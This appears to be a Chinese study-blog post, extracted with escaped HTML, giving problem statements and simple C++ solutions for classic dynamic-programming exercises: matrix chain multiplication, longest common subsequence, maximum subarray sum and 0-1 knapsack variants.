Code12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;using namespace std;int m[100][100]; //m[i][j]表示A[i:j]的最小数乘次数 int s[100][100]=&#123;0&#125;; //s[i][j]表示断点位置 int p[100]; //表示矩阵的行列值 int matrixchain(int n)&#123; for(int i=0;i&lt;=n;i++) &#123; m[i][i]=0; //对角线赋值0 &#125; for(int r=2;r&lt;=n;r++) &#123; for(int i=1;i&lt;=n-r+1;i++) &#123; int j=i+r-1; //从m[i][i+1]开始判断 i&lt;=j&lt;n m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j]; s[i][j]=i; //此时从i处断开 for(int k=i+1;k&lt;j;k++) &#123; int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; //从i+1处断开并比较大小 if(t&lt;m[i][j]) &#123; m[i][j]=t; //更新最优值 s[i][j]=k; //更新断点 &#125; &#125; &#125; &#125; &#125; int main() &#123; int N; cin&gt;&gt;N; for(int i=0;i&lt;N+1;i++) &#123; cin&gt;&gt;p[i]; &#125; matrixchain(N); cout&lt;&lt;m[1][N]&lt;&lt;endl; system(\"pause\"); return 0; &#125; 2.最长公共子序列题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;iostream&gt;using namespace std;int c[100][100];int b[100][100];char x[100],y[100];int lcslength(int m,int n) //构造最优值，以及最优解需要的条件b[i][j]&#123; int i,j; for(i=1;i&lt;=m;i++)c[i][0]=0; for(i=1;i&lt;=n;i++)c[0][i]=0; for(i=1;i&lt;=m;i++) &#123; for(j=1;j&lt;=n;j++) &#123; if(x[i]==y[j]) &#123; c[i][j]=c[i-1][j-1]+1; b[i][j]=1; &#125; else &#123; if(c[i-1][j]&gt;=c[i][j-1]) &#123; c[i][j]=c[i-1][j]; b[i][j]=2; &#125; else &#123; c[i][j]=c[i][j-1]; b[i][j]=3; &#125; &#125; &#125; &#125;&#125; void lcs(int i,int j) //构造最优解&#123; if(i==0||j==0) &#123; return; &#125; if(b[i][j]==1) &#123; lcs(i-1,j-1); cout&lt;&lt;x[i]&lt;&lt;\" \"; &#125; else if(b[i][j]==2) &#123; lcs(i-1,j); &#125; else &#123; lcs(i,j-1); &#125;&#125;int main()&#123; int m,n; cin&gt;&gt;m&gt;&gt;n; for(int i=1;i&lt;=m;i++) &#123; cin&gt;&gt;x[i]; &#125; for(int i=1;i&lt;=n;i++) &#123; cin&gt;&gt;y[i]; &#125; lcslength(m,n); cout&lt;&lt;\"length=\"&lt;&lt;c[m][n]&lt;&lt;endl; lcs(m,n); return 0;&#125; 3.最大子段和题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。提示：子段可为空集，答案为0 输入123456包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。接下来一行有n个数x(-1000&lt;=x&lt;=1000)。162 -11 4 13 -1 2 输出12输出其对应的最大子段和。18 code1234567891011121314151617181920212223242526272829303132333435#include&lt;iostream&gt;using namespace std;int a[100];int sum=0;int maxsum(int n)&#123; int b=0; for(int i=0;i&lt;n;i++) &#123; if(b&gt;0) &#123; b+=a[i]; &#125; else &#123; b=a[i]; &#125; if(b&gt;sum) &#123; sum=b; &#125; &#125;&#125;int main()&#123; int k; cin&gt;&gt;k; for(int i=0;i&lt;k;i++) &#123; cin&gt;&gt;a[i]; &#125; maxsum(k); cout&lt;&lt;sum&lt;&lt;endl; return 0; &#125; 4.0-1背包动态规划解法题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入12345678910包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost和价值（注意：结果可能超过int范围）110 52 62 36 55 44 6 输出12对每组测试数据，输出其对应的所装物品的最大价值。15 code12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;using namespace std;int m[100][100]=&#123;0&#125;;int w[100];int v[100];int knapsack(int n,int c)&#123; int jmax=min(w[n]-1,c); for(int i=0;i&lt;=jmax;i++) &#123; m[n][i]=0; &#125; for(int i=w[n];i&lt;=c;i++) &#123; m[n][i]=v[n]; &#125; for(int i=n-1;i&gt;=1;i--) &#123; jmax=min(w[i]-1,c); for(int j=0;j&lt;=jmax;j++) &#123; m[i][j]=m[i+1][j]; &#125; for(int j=w[i];j&lt;=c;j++) &#123; m[i][j]=max(m[i+1][j],m[i+1][j-w[i]]+v[i]); &#125; &#125;&#125;int main()&#123; int t; cin&gt;&gt;t; while(t--) &#123; int c,n; cin&gt;&gt;c&gt;&gt;n; for(int i=1;i&lt;=n;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; knapsack(n,c); cout&lt;&lt;m[1][c]&lt;&lt;endl; &#125; return 0;&#125; 例题 5.节食的限制题目描述 Bessie像她的诸多姊妹一样，因為从FarmerJohn的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。输入123456第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。56 415192021 输出12一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。56 code123456789101112131415161718192021222324252627#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;string.h&gt;#define inf 0x7fffffffusing namespace std;int main()&#123; int c; //最多吃的干草量 int n; //有多少捆干草 cin &gt;&gt; c &gt;&gt; n; int *wei = new int[n + 1]; int m[50000]; for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; wei[i]; &#125; memset(m, 0, sizeof(m)); for (int i = 1; i &lt;= n; i++) &#123; for (int j = c; j &gt;= wei[i]; j--) //j从大到小倒着遍历，如果大于重量，则说明可以放入，反之，则放弃这个物品，从下一个物品开始 &#123; m[j] = max(m[j], m[j - wei[i]] + wei[i]); &#125; &#125; cout &lt;&lt; m[c] &lt;&lt; endl;&#125; 矩阵连乘进阶题目描述1234567891011121314151617181920212223242526给定n个矩阵&#123;A1,A2,...,An&#125;，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。输入输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。输出对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。数据保证结果不超过1e9。样例输入3 2A 10 100B 5 50C 100 5ACBABC样例输出7500MengMengDa code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include&lt;iostream&gt;#include&lt;string.h&gt;using namespace std;int m[100][100]=&#123;0&#125;;int p[200];int maxchain(int n)&#123; for(int i=1;i&lt;=n;i++) &#123; m[i][i]=0; &#125; for(int r=2;r&lt;=n;r++) &#123; for(int i=1;i&lt;=n-r+1;i++) &#123; int j=i+r-1; m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j]; for(int k=i+1;k&lt;j;k++) &#123; int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; if(t&lt;m[i][j]) &#123; m[i][j]=t; &#125; &#125; &#125; &#125; return m[1][n];&#125;int main()&#123; int n,m; while(cin&gt;&gt;n&gt;&gt;m) &#123; char chain[30]; int h[30]; int l[30]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;chain[i]&gt;&gt;h[i]&gt;&gt;l[i]; &#125; char test[3][105]; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;test[i]; &#125; int key; for(int i=0;i&lt;m;i++) &#123; for(int j=0;j&lt;n;j++) &#123; if(test[i][0]==chain[j]) &#123; key=j; break; &#125; &#125; p[0]=h[key]; p[1]=l[key]; int len=strlen(test[i]); int flag=1; for(int k=1;k&lt;len;k++) &#123; for(int j=0;j&lt;n;j++) &#123; if(test[i][k]==chain[j]) &#123; key=j; break; &#125; &#125; if(p[k]==h[key]) &#123; p[k+1]=l[key]; &#125; else &#123; cout&lt;&lt;\"MengMengDa\"&lt;&lt;endl; flag=0; break; &#125; &#125; if(flag==1) &#123; cout&lt;&lt;maxchain(len)&lt;&lt;endl; &#125; &#125; &#125;&#125;","categories":[{"name":"Study","slug":"Study","permalink":"https://gardenia30.top/categories/Study/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://gardenia30.top/tags/Algorithm/"}]}]}